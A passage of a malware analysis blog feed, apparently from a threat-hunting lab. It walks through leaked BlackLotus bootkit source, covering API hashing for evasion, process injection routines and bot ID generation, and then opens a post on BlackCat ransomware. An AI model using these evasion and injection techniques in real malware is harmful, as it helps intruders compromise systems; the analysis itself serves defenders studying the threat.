  &lt;li&gt;
    &lt;p&gt;If the computed hash matches the input hash, it returns the base address of the module (which is effectively the same as the module handle, for the purpose of calling &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetProcAddress&lt;/code&gt;).&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;If the hash does not match, it moves to the next module in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;InLoadOrderModuleList&lt;/code&gt; and repeats the process.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;If it has checked all the modules and not found a match, it returns &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NULL&lt;/code&gt;.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Note that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LDR_MODULE&lt;/code&gt; and its linked list structures are part of the &lt;em&gt;Windows Native API&lt;/em&gt; (also known as the &lt;em&gt;“NT API”&lt;/em&gt;), which is an internal API used by Windows itself. It’s not officially documented by Microsoft, so using it can be risky: it can change between different versions or updates of Windows. However, it also provides a way to do things that can’t be done with the standard Windows API, so it’s often used in low-level code like device drivers or, in this case, bootkit malware.&lt;/p&gt;

&lt;p&gt;Also we have files like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;advapi32_functions.h&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ntdll_functions.h&lt;/code&gt;  or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user32_functions.h&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/9/2023-07-16_13-58.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This piece of code is a C++ header files that defines function pointers to a Windows API functions like: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VirtualAlloc&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OpenProcess&lt;/code&gt;, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Process32FirstW&lt;/code&gt; or NT API structures and functions:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/9/2023-07-16_14-03.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;These are being defined as function pointers rather than directly calling the functions because this can make it easier to dynamically load these functions at runtime. This can be useful in a few scenarios, such as when writing code that needs to run on multiple versions of Windows and not all functions may be available on all versions, and in our case when trying to evade detection by anti-malware tools (since these tools often flag direct calls to certain API functions as suspicious).&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetProcAddressByHash&lt;/code&gt; function in the given code is designed to look up a function in a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DLL&lt;/code&gt; using the hash of the function’s name, rather than the name itself. This is typically used in malware to make static analysis harder, as it avoids leaving clear text strings (like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;CreateProcess&quot;&lt;/code&gt;) in the binary that can be easily identified:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/9/2023-07-16_17-30.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This code also assumes that it’s running on the same architecture as the DLL it’s examining, i.e., if the code is compiled for a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;64-bit&lt;/code&gt; target, it assumes the DLL is also &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;64-bit&lt;/code&gt;, and vice versa for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;32-bit&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;It’s worth noting that manipulating the PE file format and using hashed function names like this is a common technique used in malware and rootkits to make analysis and detection more difficult.&lt;/p&gt;

&lt;p&gt;Also interesting file is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nzt.h&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/9/2023-07-16_17-33.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see, function pointer macro: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;API(Function)&lt;/code&gt; is a macro that expands to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NzT.Api.p##Function&lt;/code&gt;. This is likely used to call function pointers stored in an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;API_FUNCTIONS&lt;/code&gt; structure, which is part of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NzT_T&lt;/code&gt; struct.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NzT_T&lt;/code&gt; is a structure that bundles together various components of the bot’s functionality, including an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;API_FUNCTIONS&lt;/code&gt; structure for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;API&lt;/code&gt; function pointers, an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;API_MODULES&lt;/code&gt; structure for loaded module information, a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CRC&lt;/code&gt; type (for checksum calculations), and an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;INFECTION_TYPE&lt;/code&gt; field indicating the infection status of the bot.&lt;/p&gt;

&lt;h3 id=&quot;windows-registry&quot;&gt;Windows Registry&lt;/h3&gt;

&lt;p&gt;Then, in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;registry.c&lt;/code&gt; file implements functions for interacting with the Windows Registry:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/9/2023-07-16_17-43.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetRegistryStartPath(INT Hive)&lt;/code&gt; - This function is used to get the start path of the registry hive, based on the hive type passed to it (e.g., &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HKEY_LOCAL_MACHINE&lt;/code&gt;). The path is formatted into the form expected by the Windows kernel functions, which is a bit different from what you might usually see (e.g., &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;\Registry\Machine&quot;&lt;/code&gt; instead of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HKEY_LOCAL_MACHINE&lt;/code&gt;). The function returns this path as a wide character string (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LPWSTR&lt;/code&gt;):&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/9/2023-07-16_17-53.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RegistryOpenKeyEx(CONST LPWSTR KeyPath, HANDLE RegistryHandle, ACCESS_MASK AccessMask)&lt;/code&gt; - This function is used to open a specific key in the registry, given its path, a handle to a pre-existing key (or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NULL&lt;/code&gt; for the root of the registry), and an access mask specifying what type of access the function caller requires to the key (e.g., &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KEY_READ&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KEY_WRITE&lt;/code&gt;). It uses the NtOpenKey API function from the Windows Native API to actually open the key:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/9/2023-07-16_17-54.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RegistryReadValueEx(CONST LPWSTR KeyPath, CONST LPWSTR Name, LPWSTR* Value)&lt;/code&gt; - This function reads a value from a given key in the registry. It does this by opening the key with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RegistryOpenKeyEx&lt;/code&gt;, then querying the value with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NtQueryValueKey&lt;/code&gt;. The function reads the value’s data into a buffer, which it then returns to the caller. If anything goes wrong (e.g., the key couldn’t be opened, the value couldn’t be queried, there wasn’t enough memory to store the value’s data), the function returns &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FALSE&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/9/2023-07-16_17-55.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RegistryReadValue(INT Hive, CONST LPWSTR Path, CONST LPWSTR Name, LPWSTR* Value)&lt;/code&gt; - This function combines the functionality of the other functions. It reads a value from a specific key in a specific hive of the registry. It constructs the full path to the key by concatenating the start path of the hive (obtained with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetRegistryStartPath&lt;/code&gt;) and the rest of the key path passed to the function. It then reads the value from this key with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RegistryReadValueEx&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/9/2023-07-16_17-55_1.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;There are also two functions, but they are not used anywhere and are commented out:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/9/2023-07-16_17-56.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;filesystem&quot;&gt;Filesystem&lt;/h3&gt;

&lt;p&gt;There are also separate functions for working with files in Windows OS - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file.c&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/9/2023-07-16_17-59.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;which implements such functions as, for example &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FileGetInfo&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FileGetSize&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FileOpen&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FileWrite&lt;/code&gt;, etc.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FileGetInfo(HANDLE FileHandle, PFILE_STANDARD_INFORMATION Info)&lt;/code&gt; - This function retrieves standard information about a file. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NtQueryInformationFile&lt;/code&gt; function is used to retrieve the information. It takes a handle to an open file and a pointer to a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FILE_STANDARD_INFORMATION&lt;/code&gt; structure to fill with information. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MemoryZero&lt;/code&gt; function is used to clear these structures before use.&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FILE_STANDARD_INFORMATION&lt;/code&gt; structure includes several file attributes such as the allocation size of the file, the end of the file, the number of links to the file, and flags to indicate if the file is a directory or if it is deleted. If the operation is successful, the function returns &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TRUE&lt;/code&gt;. If the operation fails, it returns &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FALSE&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FileGetSize(HANDLE FileHandle, PDWORD FileSize)&lt;/code&gt; - This function retrieves the size of a file. It does so by calling &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FileGetInfo&lt;/code&gt; to get the standard information of the file, and then sets the value pointed to by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FileSize&lt;/code&gt; to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AllocationSize.LowPart&lt;/code&gt; of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FILE_STANDARD_INFORMATION&lt;/code&gt; structure:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/9/2023-07-16_18-07.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Note that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AllocationSize&lt;/code&gt; is a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LARGE_INTEGER&lt;/code&gt; (which is a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;64-bit&lt;/code&gt; value), and this function is only returning the lower 32 bits of it, which may be incorrect for files larger than &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;4GB&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;injections&quot;&gt;Injections&lt;/h3&gt;

&lt;p&gt;Another functions from source code of investigated malware, for injection logic:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/9/2023-07-16_18-11.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;For example:&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;LPVOID&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InjectData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;HANDLE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;LPVOID&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Size&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/9/2023-07-16_18-13.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here’s a breakdown of what the function does:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NzT.Api.pVirtualAllocEx(Process, NULL, Size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)&lt;/code&gt; - It starts by allocating memory within the virtual memory space of a target process. The size of the allocated memory is specified by the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Size&lt;/code&gt; parameter. The memory is both committed (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MEM_COMMIT&lt;/code&gt;) and reserved (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MEM_RESERVE&lt;/code&gt;) for future use. The allocated memory has read, write, and execute permissions (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PAGE_EXECUTE_READWRITE&lt;/code&gt;). The address of the allocated memory is saved in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Address&lt;/code&gt; variable. If this operation fails, the function returns &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NULL&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NzT.Api.pWriteProcessMemory(Process, Address, Data, Size, NULL)&lt;/code&gt; - If memory allocation is successful, the function proceeds to write data into the allocated memory within the target process. It does this using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WriteProcessMemory&lt;/code&gt; function. This function copies data from a buffer (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Data&lt;/code&gt;) in the current process to the allocated memory (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Address&lt;/code&gt;) in the target process. If the operation fails, it frees the allocated memory using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VirtualFreeEx&lt;/code&gt; and returns &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NULL&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;If both operations are successful, the function returns the address of the allocated memory in the target process. This can then be used for various purposes, such as executing the injected code.&lt;/p&gt;

&lt;p&gt;This type of functionality is often seen in malware that injects malicious code into legitimate processes to hide its activities or gain higher privileges.&lt;/p&gt;

&lt;p&gt;What about this injection logic?&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InjectCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;HANDLE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;LPVOID&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Function&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;which also implemented in this file:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/9/2023-07-16_18-17.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This function appears to inject code into a target process by creating a section of memory, copying the code into this section, performing relocations, and finally mapping this section into the target process.&lt;/p&gt;

&lt;p&gt;Once all the tasks are performed, the function will clean up by closing any open handles and unmap any mapped views of files. Finally, it will return the address of the injected function in the target process.&lt;/p&gt;

&lt;p&gt;As with many other kinds of code injection techniques, this one is also commonly seen in malware.&lt;/p&gt;

&lt;h3 id=&quot;pseudo-random-generator&quot;&gt;Pseudo-Random Generator&lt;/h3&gt;

&lt;p&gt;And there are several functions in this malware &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;guid.c&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/9/2023-07-16_18-22.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;These functions are designed to generate a pseudo-random &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GUID (Globally Unique Identifier)&lt;/code&gt;. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GUID&lt;/code&gt; is built from the values produced by a simple linear congruential generator (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LCG&lt;/code&gt;), which is a type of pseudorandom number generator.&lt;/p&gt;

&lt;p&gt;Here’s what each function does:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GuidRandom(PDWORD Seed)&lt;/code&gt; - This is a linear congruential generator (LCG) function that takes a seed as a parameter and generates a pseudorandom number. It’s important to note that this LCG function always produces the same sequence of numbers if the initial seed is the same:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/9/2023-07-16_18-24.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GuidGenerate(GUID * Guid, PDWORD Seed)&lt;/code&gt; - This function takes a pointer to a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GUID&lt;/code&gt; structure and a pointer to a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DWORD  seed&lt;/code&gt; as parameters. It generates a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GUID&lt;/code&gt; by calling &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GuidRandom(Seed)&lt;/code&gt; to generate pseudorandom numbers and assign them to the four parts of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GUID&lt;/code&gt; structure (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Data1, Data2, Data3, Data4&lt;/code&gt;):&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/9/2023-07-16_18-25.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GuidGenerateEx(PDWORD Seed)&lt;/code&gt; - This function generates a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GUID&lt;/code&gt; string. It calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GuidGenerate(&amp;amp;Guid, Seed)&lt;/code&gt; to generate a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GUID&lt;/code&gt; and then converts this &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GUID&lt;/code&gt; to a string format with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GuidToString(&amp;amp;Guid)&lt;/code&gt;. This string is then copied to a newly allocated memory block, and a pointer to this block is returned:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/9/2023-07-16_18-27.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As for the context of malware, the generated GUIDs might be used for a variety of purposes including marking infected systems, communicating with command-and-control (C2) servers, or creating mutexes to avoid multiple instances of the malware. In our case, this functions used for generate Bot ID.&lt;/p&gt;

&lt;h3 id=&quot;utils&quot;&gt;Utils&lt;/h3&gt;

&lt;p&gt;There is also a file with utilities where there are a lot of auxiliary functions &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;utils.c&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/9/2023-07-16_18-33.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;For example, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetProcessIdByHandle (HANDLE Process)&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/9/2023-07-16_18-37.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This function, retrieves the unique process ID of a process given a handle to the process.&lt;/p&gt;

&lt;p&gt;Or function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetProcessIdByHash(DWORD Hash)&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/9/2023-07-16_18-40.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;which returns the Process ID (PID) of a process given its hash. This function scans all running processes on the system and returns the PID of the process whose executable name matches the provided hash.&lt;/p&gt;

&lt;p&gt;The function creates a snapshot of all processes currently running on the system by calling the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CreateToolhelp32Snapshot&lt;/code&gt; function. If the snapshot creation fails, it returns &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-1&lt;/code&gt; to indicate the failure. It then retrieves the first process in the snapshot using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Process32FirstW&lt;/code&gt; function. If this function fails, it closes the snapshot handle and returns &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-1&lt;/code&gt; to indicate the failure. The function then enters a loop, where it calculates the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CRC32&lt;/code&gt; hash of the current process’s executable name (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;szExeFile&lt;/code&gt;). It checks whether this calculated hash is equal to the input hash. If it is, the function breaks out of the loop and returns the Process ID (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;th32ProcessID&lt;/code&gt;) of the current process. If the hash doesn’t match, it proceeds to the next process in the snapshot using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Process32NextW&lt;/code&gt; function and repeats previous steps. After the loop, it closes the snapshot handle and returns the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PID&lt;/code&gt; of the process with the matching hash. If no matching process was found, it returns &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-1&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CreateMutexOfProcess(DWORD ProcessID)&lt;/code&gt; function is attempting to create a mutex (a synchronization object) with a unique name based on the process ID and the serial number of the disk volume (which is obtained by the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetSerialNumber()&lt;/code&gt; function):&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/9/2023-07-16_18-58.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A mutex can be used to prevent multiple instances of a malware or application from running at the same time. In this case, the mutex name is generated by concatenating the disk volume’s serial number and the process ID, which should provide a unique mutex for each running instance of the process.&lt;/p&gt;

&lt;p&gt;Also, interesting logic in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;destroyOS()&lt;/code&gt; function:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/9/2023-07-16_19-02.png&quot; alt=&quot;blacklotus&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;but it’s also commented.&lt;/p&gt;

&lt;p&gt;That’s all today. In the next part we will investigate another modules.&lt;/p&gt;

&lt;p&gt;We hope this post spreads awareness to the blue teamers of this interesting malware techniques, and adds a weapon to the red teamers arsenal.&lt;/p&gt;

&lt;p&gt;By Cyber Threat Hunters from MSSPLab:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.linkedin.com/in/zhassulan-zhussupov-5a347419b/&quot;&gt;@cocomelonc&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.linkedin.com/in/aruzhan-kaldybek-775735226&quot;&gt;@wqkasper&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;references&quot;&gt;References&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/ldpreload/BlackLotus&quot;&gt;https://github.com/ldpreload/BlackLotus&lt;/a&gt;      &lt;br /&gt;
&lt;a href=&quot;https://malpedia.caad.fkie.fraunhofer.de/details/win.blacklotus&quot;&gt;https://malpedia.caad.fkie.fraunhofer.de/details/win.blacklotus&lt;/a&gt;     &lt;br /&gt;
&lt;a href=&quot;https://twitter.com/threatintel/status/1679906101838356480&quot;&gt;https://twitter.com/threatintel/status/1679906101838356480&lt;/a&gt;    &lt;br /&gt;
&lt;a href=&quot;https://twitter.com/TheCyberSecHub/status/1680044350820999168&quot;&gt;https://twitter.com/TheCyberSecHub/status/1680044350820999168&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Thanks for your time happy hacking and good bye!       &lt;br /&gt;
&lt;em&gt;All drawings and screenshots are MSSPLab’s&lt;/em&gt;&lt;/p&gt;</content><author><name>MSSP Lab</name></author><category term="threat-hunting" /><category term="blueteam" /><category term="malware" /><category term="malwareanalysis" /><summary type="html">BlackLotus is a UEFI bootkit that targets Windows and is capable of evading security software, persisting once it has infected a system, bypassing Secure Boot on fully patched installations of Windows 11, and executing payloads with the highest level of privileges available in the operating system.</summary></entry><entry><title type="html">Malware analysis report: BlackCat ransomware</title><link href="http://localhost:4001/threat-hunting/2023/07/13/malware-analysis-blackcat.html" rel="alternate" type="text/html" title="Malware analysis report: BlackCat ransomware" /><published>2023-07-13T05:00:00+03:00</published><updated>2023-07-13T05:00:00+03:00</updated><id>http://localhost:4001/threat-hunting/2023/07/13/malware-analysis-blackcat</id><content type="html" xml:base="http://localhost:4001/threat-hunting/2023/07/13/malware-analysis-blackcat.html">&lt;p&gt;&lt;strong&gt;BlackCat&lt;/strong&gt; is Rust-based ransomware distributed via the &lt;em&gt;Ransomware-as-a-Service (RaaS)&lt;/em&gt; model. BlackCat was observed for the first time in November 2021 and has since been used to target multiple sectors and organizations in numerous countries and regions in Africa, the Americas, Asia, Australia, and Europe.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/8/blackcat.png&quot; alt=&quot;blackcat&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This ransomware and group caught our attention after this interesting news: &lt;em&gt;“ALPHV ransomware group claims to have ransomed Maruchan, the company that creates instant noodles.”&lt;/em&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/8/2023-07-14_01-31.png&quot; alt=&quot;cat&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
